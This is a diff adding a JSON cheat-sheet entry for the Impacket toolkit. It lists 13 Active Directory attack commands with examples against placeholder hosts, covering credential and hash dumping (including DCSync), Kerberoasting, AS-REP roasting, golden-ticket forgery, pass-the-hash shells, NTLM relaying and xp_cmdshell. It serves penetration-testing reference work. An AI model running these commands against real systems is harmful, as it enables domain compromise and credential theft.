@@ -1,0 +1,117 @@
+{
+  "tool": "impacket",
+  "name": "Impacket",
+  "description": "A collection of Python classes and ready-made scripts for Windows network protocols (SMB, MS-RPC, Kerberos, LDAP) — the backbone of modern Active Directory exploitation.",
+  "tags": [
+    "Active Directory",
+    "Kerberos",
+    "SMB",
+    "Python"
+  ],
+  "homepage": "https://github.com/fortra/impacket",
+  "docs": "https://github.com/fortra/impacket",
+  "install": {
+    "pipx": "pipx install impacket",
+    "apt": "sudo apt install python3-impacket"
+  },
+  "related": [
+    "crackmapexec",
+    "certipy",
+    "responder",
+    "mimikatz"
+  ],
+  "total_commands": 13,
+  "commands": [
+    {
+      "id": 1,
+      "category": "Credentials & hashes",
+      "command": "secretsdump.py <domain>/<user>:<pass>@<target>",
+      "example": "secretsdump.py corp.local/svc:Summer2026@10.10.10.5",
+      "explanation": "Dumps SAM, LSA secrets and cached domain credentials from a host over SMB."
+    },
+    {
+      "id": 2,
+      "category": "Credentials & hashes",
+      "command": "secretsdump.py -just-dc <domain>/<user>@<dc>",
+      "example": "secretsdump.py -just-dc corp.local/administrator@10.10.10.1",
+      "explanation": "DCSync: pulls every domain hash straight from a domain controller (needs replication rights)."
+    },
+    {
+      "id": 3,
+      "category": "Credentials & hashes",
+      "command": "secretsdump.py -just-dc-ntlm <domain>/<user>@<dc>",
+      "example": "secretsdump.py -just-dc-ntlm corp.local/administrator@10.10.10.1",
+      "explanation": "Only NTLM hashes from the DC, skipping Kerberos keys."
+    },
+    {
+      "id": 4,
+      "category": "Credentials & hashes",
+      "command": "getTGT.py <domain>/<user> -hashes :<nt>",
+      "example": "getTGT.py corp.local/svc -hashes :aad3b435b51404eeaad3b435b51404ee",
+      "explanation": "Requests a Kerberos TGT with a password or NT hash and saves a .ccache for pass-the-ticket."
+    },
+    {
+      "id": 5,
+      "category": "Kerberos attacks",
+      "command": "GetNPUsers.py <domain>/ -usersfile <file> -no-pass -dc-ip <ip>",
+      "example": "GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.1",
+      "explanation": "AS-REP roasting: pulls crackable hashes for accounts that do not require Kerberos pre-authentication."
+    },
+    {
+      "id": 6,
+      "category": "Kerberos attacks",
+      "command": "GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <ip> -request",
+      "example": "GetUserSPNs.py corp.local/svc:pass -dc-ip 10.10.10.1 -request",
+      "explanation": "Kerberoasting: requests service tickets for SPN accounts and outputs hashes to crack offline."
+    },
+    {
+      "id": 7,
+      "category": "Kerberos attacks",
+      "command": "ticketer.py -nthash <nt> -domain-sid <sid> -domain <domain> <user>",
+      "example": "ticketer.py -nthash abc123 -domain-sid S-1-5-21-111-222-333 -domain corp.local Administrator",
+      "explanation": "Forges a golden or silver ticket from the krbtgt or a service account hash."
+    },
+    {
+      "id": 8,
+      "category": "Remote execution",
+      "command": "psexec.py <domain>/<user>:<pass>@<target>",
+      "example": "psexec.py corp.local/administrator:pass@10.10.10.5",
+      "explanation": "A SYSTEM shell via a temporary Windows service over SMB."
+    },
+    {
+      "id": 9,
+      "category": "Remote execution",
+      "command": "wmiexec.py <domain>/<user>:<pass>@<target>",
+      "example": "wmiexec.py corp.local/administrator:pass@10.10.10.5",
+      "explanation": "A semi-interactive shell over WMI, quieter than psexec."
+    },
+    {
+      "id": 10,
+      "category": "Remote execution",
+      "command": "psexec.py -hashes :<nt> <domain>/<user>@<target>",
+      "example": "psexec.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 corp.local/administrator@10.10.10.5",
+      "explanation": "Pass-the-hash: authenticates with an NT hash instead of a password."
+    },
+    {
+      "id": 11,
+      "category": "Relaying & databases",
+      "command": "ntlmrelayx.py -tf <targets> -smb2support",
+      "example": "ntlmrelayx.py -tf targets.txt -smb2support",
+      "explanation": "Relays captured NTLM authentication to other hosts; pair with Responder in analyze mode."
+    },
+    {
+      "id": 12,
+      "category": "Relaying & databases",
+      "command": "ntlmrelayx.py -t ldap://<dc> --escalate-user <user>",
+      "example": "ntlmrelayx.py -t ldap://10.10.10.1 --escalate-user lowpriv",
+      "explanation": "Relays to LDAP to grant a controlled user DCSync rights."
+    },
+    {
+      "id": 13,
+      "category": "Relaying & databases",
+      "command": "mssqlclient.py <domain>/<user>:<pass>@<target>",
+      "example": "mssqlclient.py corp.local/sa:pass@10.10.10.9",
+      "explanation": "Connects to MSSQL for enumeration and xp_cmdshell execution."
+    }
+  ]
+}
